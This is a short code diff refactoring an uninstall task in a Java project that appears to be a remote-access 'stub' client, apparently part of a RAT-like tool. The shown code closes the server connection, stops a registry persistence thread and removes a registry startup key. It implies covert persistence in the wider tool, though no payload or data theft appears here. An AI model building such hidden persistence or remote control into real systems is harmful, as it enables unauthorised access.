@@ -1,6 +1,7 @@
 package me.jershdervis.monitorj.stub.client.tasks;
 
 import me.jershdervis.monitorj.stub.MonitorJStub;
+import me.jershdervis.monitorj.stub.client.BaseClient;
 import me.jershdervis.monitorj.stub.client.PacketTask;
 import me.jershdervis.monitorj.stub.client.Packets;
 import me.jershdervis.monitorj.stub.util.ClientSystemUtil;
@@ -18,13 +19,13 @@ import java.net.URISyntaxException;
 public class UninstallClientApplicationTask extends PacketTask {
 
     public UninstallClientApplicationTask() {
-        super(Packets.UNINSTALL_CLIENT_APPLICATION);
+        super(Packets.UNINSTALL_CLIENT_APPLICATION.getPacketID());
     }
 
     @Override
-    public void run(DataInputStream inputStream, DataOutputStream outputStream) throws IOException {
+    public void run(BaseClient client) throws IOException {
         //Close connection to server
-        MonitorJStub.getInstance().getClientServerConnection().getServerSocketConnection().close();
+        client.getServerSocketConnection().close();
         //Stop registry persistence
         MonitorJStub.getInstance().getRegPersistThread().interrupt();
         //Remove registry startup key
